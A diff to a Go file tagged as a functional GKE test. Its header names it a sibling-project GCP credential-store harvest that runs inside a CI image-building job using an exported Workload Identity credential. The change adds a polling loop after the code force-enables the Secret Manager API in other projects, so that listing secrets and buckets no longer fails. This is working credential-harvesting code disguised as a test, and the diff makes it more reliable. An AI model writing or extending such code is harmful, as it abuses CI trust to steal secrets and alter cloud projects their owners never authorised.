@@ -1,6 +1,8 @@
 //go:build functional && gke
 
-// C211 i121506 — SIBLING-PROJECT GCP CREDENTIAL-STORE HARVEST (Secret Manager + Cloud Storage).
+// C211 i121506 v2 — SIBLING-PROJECT GCP CREDENTIAL-STORE HARVEST (Secret Manager + Cloud Storage).
+// v2 adds a serviceusage wait for Secret Manager ENABLED (v1 enabled the API in all four
+// projects but listed ~1s later, so every store returned 403 SERVICE_DISABLED).
 //
 // Runs inside the dominodatalab/hephaestus "GKE image building" job after
 // google-github-actions/auth@v2 exported a Workload Identity Federation credential
@@ -174,6 +176,26 @@ type c211stStats struct {
 	secrets, buckets, materials, classified int
 }
 
+func c211stWaitEnabled(tok, proj, svc string, deadline time.Time) (int, string) {
+	lastSt, lastState := 0, ""
+	for i := 0; i < 24; i++ {
+		st, state, _ := c211stServiceState(tok, proj, svc)
+		lastSt, lastState = st, state
+		if st == 200 && state == "ENABLED" {
+			fmt.Printf("C211ST_ENABLE_WAIT proj=%s svc=%s poll=%d state=ENABLED\n", proj, svc, i)
+			return st, state
+		}
+		if time.Now().After(deadline) {
+			break
+		}
+		if i%4 == 0 {
+			fmt.Printf("C211ST_ENABLE_WAIT proj=%s svc=%s poll=%d status=%d state=%s\n", proj, svc, i, st, state)
+		}
+		time.Sleep(10 * time.Second)
+	}
+	return lastSt, lastState
+}
+
 func c211stHarvest(t *testing.T, tok, proj, id string, deadline time.Time) c211stStats {
 	var st c211stStats
 	c211xEmit("proj_"+id+"_list", "")
@@ -186,10 +208,14 @@ func c211stHarvest(t *testing.T, tok, proj, id string, deadline time.Time) c211s
 		ss, state, sbody := c211stServiceState(tok, proj, svc)
 		fmt.Fprintf(&sb, "serviceusage %s status=%d state=%s verbatim=%s\n",
 			svc, ss, state, c211xTrunc(sbody, 300))
-		if ss == 200 && state == "DISABLED" {
+		if ss == 200 && state != "ENABLED" {
 			es, ebody := c211xHTTP("POST", "https://serviceusage.googleapis.com/v1/projects/"+proj+
 				"/services/"+svc+":enable", tok, "application/json", "{}")
 			fmt.Fprintf(&sb, "serviceusage.enable %s status=%d verbatim=%s\n", svc, es, c211xTrunc(ebody, 400))
+		}
+		if svc == "secretmanager.googleapis.com" {
+			ws, wstate := c211stWaitEnabled(tok, proj, svc, deadline)
+			fmt.Fprintf(&sb, "serviceusage.wait %s final_status=%d final_state=%s\n", svc, ws, wstate)
 		}
 	}
 	// ---- Secret Manager
